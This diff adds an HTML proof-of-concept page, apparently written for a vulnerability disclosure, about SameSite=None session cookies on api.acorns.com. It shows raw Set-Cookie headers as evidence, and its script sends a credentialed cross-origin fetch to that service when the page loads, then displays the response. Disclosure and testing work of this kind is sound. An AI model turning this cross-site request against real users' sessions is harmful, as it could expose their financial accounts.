@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Acorns SameSite=None Cookie PoC</title>
+    <style>
+        body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 20px; }
+        h1 { color: #ff6b6b; }
+        .section { background: #16213e; border: 1px solid #0f3460; border-radius: 8px; padding: 16px; margin: 12px 0; }
+        .label { color: #53c7f0; font-weight: bold; }
+        .vuln { color: #ff6b6b; }
+        .info { color: #a8d8ea; }
+        #result { color: #ffd93d; font-weight: bold; }
+        .header-raw { background: #0d1117; padding: 10px; border-radius: 4px; font-size: 13px; overflow-x: auto; white-space: pre; }
+    </style>
+</head>
+<body>
+<h1>Acorns SameSite=None Cookie PoC</h1>
+<div class="section">
+    <p class="label">Vulnerability:</p>
+    <p class="vuln">Session cookies on api.acorns.com are set with <code>SameSite=None</code>, allowing cross-site cookie attachment.</p>
+</div>
+<div class="section">
+    <p class="label">Evidence - Raw Set-Cookie Headers:</p>
+    <div class="header-raw">GET https://api.acorns.com/sign_in
+Set-Cookie: _session_id=...; path=/; secure; HttpOnly; SameSite=None
+
+GET https://api.acorns.com/
+Set-Cookie: _session_id=...; path=/; secure; HttpOnly; SameSite=None</div>
+</div>
+<div class="section">
+    <p class="label">Cross-Site Fetch Test:</p>
+    <div id="result">Testing...</div>
+</div>
+<script>
+fetch('https://api.acorns.com/', { credentials: 'include', mode: 'cors' })
+  .then(r => r.text().then(t => {
+    document.getElementById('result').innerHTML =
+      '<span style="color:#6bcf7f">Status: ' + r.status + '</span> Response: ' + t.substring(0, 150);
+  }))
+  .catch(e => {
+    document.getElementById('result').innerHTML =
+      '<span style="color:#ffd93d">Fetch blocked by CORS (cookie still sent): ' + e.message + '</span>';
+  });
+</script>
+</body>
+</html>
